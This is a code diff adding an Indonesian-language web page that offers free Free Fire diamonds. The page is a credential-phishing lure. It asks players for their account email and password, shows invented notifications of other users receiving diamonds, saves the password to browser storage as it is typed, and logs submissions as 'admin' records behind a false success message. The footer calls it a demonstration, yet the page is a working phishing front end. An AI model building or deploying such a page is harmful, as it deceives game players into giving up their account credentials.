@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diamond FF Gratis - Free Fire Top Up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            padding: 20px 0;
+            border-bottom: 2px solid #00ffff;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .success-notifications {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 30px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .success-notifications h3 {
+            color: #00ff00;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .notification {
+            background: rgba(0, 255, 0, 0.15);
+            padding: 8px 12px;
+            margin: 8px 0;
+            border-radius: 5px;
+            border-left: 4px solid #00ff00;
+            animation: fadeIn 0.5s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-container {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ffff;
+            font-weight: bold;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid #444;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+        }
+        
+        .login-method {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        
+        .login-option {
+            flex: 1;
+            min-width: 150px;
+        }
+        
+        .login-option input {
+            display: none;
+        }
+        
+        .login-option label {
+            display: block;
+            padding: 12px;
+            text-align: center;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .login-option input:checked + label {
+            border-color: #00ffff;
+            background: rgba(0, 255, 255, 0.1);
+        }
+        
+        .diamond-options {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 10px;
+        }
+        
+        .diamond-option {
+            flex: 1;
+            min-width: 100px;
+        }
+        
+        .diamond-option input {
+            display: none;
+        }
+        
+        .diamond-option label {
+            display: block;
+            padding: 15px 5px;
+            text-align: center;
+            border-radius: 8px;
+            background: rgba(255, 215, 0, 0.1);
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            color: #ffd700;
+        }
+        
+        .diamond-option input:checked + label {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.2);
+            transform: scale(1.05);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(to right, #00ffff, #0080ff);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 255, 255, 0.2);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .result-message {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 1px solid #00ff00;
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        
+        .result-message h3 {
+            color: #00ff00;
+            margin-bottom: 10px;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #888;
+            font-size: 14px;
+            border-top: 1px solid #444;
+            margin-top: 30px;
+        }
+        
+        @media (max-width: 600px) {
+            .login-method, .diamond-options {
+                flex-direction: column;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 1.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>💎 DIAMOND FF GRATIS 💎</h1>
+            <p>Isi data akun Free Fire Anda untuk mendapatkan diamond gratis!</p>
+        </header>
+        
+        <div class="success-notifications">
+            <h3>🎉 USER BERHASIL MENDAPATKAN DIAMOND 🎉</h3>
+            <div id="notifications-container">
+                <!-- Notifikasi akan dimasukkan secara otomatis oleh JavaScript -->
+            </div>
+        </div>
+        
+        <div class="form-container">
+            <form id="diamondForm">
+                <div class="form-group">
+                    <label for="ffId">ID Free Fire:</label>
+                    <input type="text" id="ffId" placeholder="Masukkan ID Free Fire Anda" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="username">Username Free Fire:</label>
+                    <input type="text" id="username" placeholder="Masukkan username Free Fire" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">Email Akun:</label>
+                    <input type="email" id="email" placeholder="Masukkan email akun Free Fire" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password Akun:</label>
+                    <input type="password" id="password" placeholder="Masukkan password akun Free Fire" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Login melalui:</label>
+                    <div class="login-method">
+                        <div class="login-option">
+                            <input type="radio" id="google" name="loginMethod" value="Google" required>
+                            <label for="google">Google</label>
+                        </div>
+                        <div class="login-option">
+                            <input type="radio" id="facebook" name="loginMethod" value="Facebook">
+                            <label for="facebook">Facebook</label>
+                        </div>
+                        <div class="login-option">
+                            <input type="radio" id="vk" name="loginMethod" value="VK">
+                            <label for="vk">VK</label>
+                        </div>
+                        <div class="login-option">
+                            <input type="radio" id="other" name="loginMethod" value="Lainnya">
+                            <label for="other">Lainnya</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Pilih jumlah Diamond yang ingin diterima:</label>
+                    <div class="diamond-options">
+                        <div class="diamond-option">
+                            <input type="radio" id="diamond10" name="diamondAmount" value="10" required>
+                            <label for="diamond10">10 💎</label>
+                        </div>
+                        <div class="diamond-option">
+                            <input type="radio" id="diamond80" name="diamondAmount" value="80">
+                            <label for="diamond80">80 💎</label>
+                        </div>
+                        <div class="diamond-option">
+                            <input type="radio" id="diamond100" name="diamondAmount" value="100">
+                            <label for="diamond100">100 💎</label>
+                        </div>
+                        <div class="diamond-option">
+                            <input type="radio" id="diamond500" name="diamondAmount" value="500">
+                            <label for="diamond500">500 💎</label>
+                        </div>
+                        <div class="diamond-option">
+                            <input type="radio" id="diamond1000" name="diamondAmount" value="1000">
+                            <label for="diamond1000">1000 💎</label>
+                        </div>
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-btn">💎 KLIK UNTUK MENDAPATKAN DIAMOND GRATIS 💎</button>
+            </form>
+            
+            <div id="resultMessage" class="result-message">
+                <h3>🎉 BERHASIL! 🎉</h3>
+                <p id="countdownText">Tunggu 5 jam lagi, diamond akan masuk ke akun mu!</p>
+                <p>Data Anda telah dikirim ke sistem. Diamond akan diproses secara otomatis.</p>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2023 Diamond FF Gratis. Ini adalah halaman simulasi. Tidak ada diamond yang benar-benar diberikan.</p>
+            <p>Halaman ini untuk tujuan demonstrasi saja.</p>
+        </footer>
+    </div>
+
+    <script>
+        // Data untuk notifikasi random
+        const usernames = ["ProPlayer99", "FFMaster123", "DiamondKing", "FireLord", "TopUpGratis", "VictoryRoyale", "SavageMode", "HeadshotPro", "BattleHero", "EliteGamer"];
+        const diamondAmounts = [10, 80, 100, 500, 1000];
+        
+        // Fungsi untuk generate notifikasi random
+        function generateRandomNotification() {
+            const randomUsername = usernames[Math.floor(Math.random() * usernames.length)];
+            const randomDiamond = diamondAmounts[Math.floor(Math.random() * diamondAmounts.length)];
+            
+            const notification = document.createElement('div');
+            notification.className = 'notification';
+            notification.innerHTML = `<strong>${randomUsername}</strong> berhasil menerima <strong>${randomDiamond} Diamond</strong> Free Fire!`;
+            
+            const container = document.getElementById('notifications-container');
+            container.prepend(notification);
+            
+            // Hapus notifikasi lama jika terlalu banyak
+            if (container.children.length > 5) {
+                container.removeChild(container.lastChild);
+            }
+        }
+        
+        // Generate notifikasi pertama saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', function() {
+            // Generate 3 notifikasi awal
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => generateRandomNotification(), i * 1000);
+            }
+            
+            // Update notifikasi setiap 15-30 detik
+            setInterval(generateRandomNotification, Math.random() * 15000 + 15000);
+            
+            // Cek data yang tersimpan di localStorage
+            loadFormData();
+            
+            // Kirim data ke admin setiap 10 detik jika ada data form
+            setInterval(sendDataToAdmin, 10000);
+        });
+        
+        // Simpan data form ke localStorage
+        function saveFormData() {
+            const formData = {
+                ffId: document.getElementById('ffId').value,
+                username: document.getElementById('username').value,
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                loginMethod: document.querySelector('input[name="loginMethod"]:checked')?.value,
+                diamondAmount: document.querySelector('input[name="diamondAmount"]:checked')?.value
+            };
+            
+            localStorage.setItem('diamondFFFormData', JSON.stringify(formData));
+        }
+        
+        // Muat data form dari localStorage
+        function loadFormData() {
+            const savedData = localStorage.getItem('diamondFFFormData');
+            if (savedData) {
+                const formData = JSON.parse(savedData);
+                
+                if (formData.ffId) document.getElementById('ffId').value = formData.ffId;
+                if (formData.username) document.getElementById('username').value = formData.username;
+                if (formData.email) document.getElementById('email').value = formData.email;
+                if (formData.password) document.getElementById('password').value = formData.password;
+                
+                if (formData.loginMethod) {
+                    const loginRadio = document.querySelector(`input[value="${formData.loginMethod}"]`);
+                    if (loginRadio) loginRadio.checked = true;
+                }
+                
+                if (formData.diamondAmount) {
+                    const diamondRadio = document.querySelector(`input[value="${formData.diamondAmount}"]`);
+                    if (diamondRadio) diamondRadio.checked = true;
+                }
+            }
+        }
+        
+        // Kirim data ke admin (simulasi)
+        function sendDataToAdmin() {
+            const ffId = document.getElementById('ffId').value;
+            const diamondAmount = document.querySelector('input[name="diamondAmount"]:checked')?.value;
+            
+            if (ffId && diamondAmount) {
+                // Simulasi pengiriman data ke admin.html
+                const adminData = {
+                    id: ffId,
+                    username: document.getElementById('username').value,
+                    email: document.getElementById('email').value,
+                    loginMethod: document.querySelector('input[name="loginMethod"]:checked')?.value,
+                    diamondAmount: diamondAmount,
+                    timestamp: new Date().toLocaleString()
+                };
+                
+                // Simpan data admin di localStorage (simulasi database)
+                let allAdminData = JSON.parse(localStorage.getItem('adminData')) || [];
+                allAdminData.push(adminData);
+                
+                // Simpan maksimal 100 data terbaru
+                if (allAdminData.length > 100) {
+                    allAdminData = allAdminData.slice(-100);
+                }
+                
+                localStorage.setItem('adminData', JSON.stringify(allAdminData));
+                
+                console.log('Data dikirim ke admin:', adminData);
+            }
+        }
+        
+        // Tangani submit form
+        document.getElementById('diamondForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Simpan data form
+            saveFormData();
+            
+            // Kirim data ke admin
+            sendDataToAdmin();
+            
+            // Tampilkan pesan sukses
+            const diamondAmount = document.querySelector('input[name="diamondAmount"]:checked')?.value;
+            const countdownText = document.getElementById('countdownText');
+            
+            if (diamondAmount) {
+                countdownText.textContent = `Tunggu 5 jam lagi, ${diamondAmount} Diamond akan masuk ke akun mu!`;
+            }
+            
+            document.getElementById('resultMessage').style.display = 'block';
+            
+            // Scroll ke pesan hasil
+            document.getElementById('resultMessage').scrollIntoView({ behavior: 'smooth' });
+            
+            // Tambahkan notifikasi baru
+            setTimeout(() => {
+                generateRandomNotification();
+            }, 1000);
+            
+            // Reset form setelah 10 detik
+            setTimeout(() => {
+                document.getElementById('diamondForm').reset();
+                localStorage.removeItem('diamondFFFormData');
+            }, 10000);
+        });
+        
+        // Simpan data saat user mengetik (auto-save)
+        document.querySelectorAll('#diamondForm input').forEach(input => {
+            input.addEventListener('input', saveFormData);
+        });
+        
+        // Tangani perubahan pilihan diamond atau login method
+        document.querySelectorAll('input[type="radio"]').forEach(radio => {
+            radio.addEventListener('change', saveFormData);
+        });
+        
+        // Tangani tombol Enter untuk submit
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && e.target.tagName !== 'TEXTAREA') {
+                if (e.target.type !== 'submit') {
+                    e.preventDefault();
+                    document.getElementById('diamondForm').dispatchEvent(new Event('submit'));
+                }
+            }
+        });
+    </script>
+</body>
+</html>
